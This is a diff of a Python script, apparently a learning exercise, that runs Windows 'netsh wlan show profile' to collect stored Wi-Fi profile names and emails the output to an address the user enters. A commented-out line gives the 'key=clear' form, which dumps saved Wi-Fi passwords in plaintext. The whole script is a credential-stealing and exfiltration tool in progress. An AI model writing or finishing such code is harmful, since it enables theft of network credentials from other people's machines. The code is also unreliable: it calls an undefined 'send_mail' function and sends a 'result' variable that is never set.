@@ -20,12 +20,23 @@ def send_email(email, password, message):
 #command = "netsh wlan show profile <ESSID> key=clear" #-show wlan profiles stored on winx computer, key in plaintext form
 email = input("Enter email address to send to: ")
 password = input("Enter email password: ")
-command = "hostname"
+#command = "hostname"
 #result = subprocess.check_output(command, shell=True)
+
+command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
+
 networks = subprocess.check_output(command, shell=True)
-network_names = re.search("(Profile\s*:\s) (.*)", networks)
+#network_names = re.search("(?:Profile\s*:\s) (.*)", networks)
 # \s regex to search for blank space, * specifies any number of blank spaces
 # ( second group - . -any char, * - any number of ocurrences
+# ?: - non-capturing group
+
+network_names = re.findall("(?:Profile\s*:\s) (.*)", networks)
+#findall is a new RE that will return any instances of the text specified and place in list
+
+print(network_names)
+
+#print(network_names.group(0))
 
 send_mail(email, password, result)
 #no hardcoded creds to see here, move along creeps
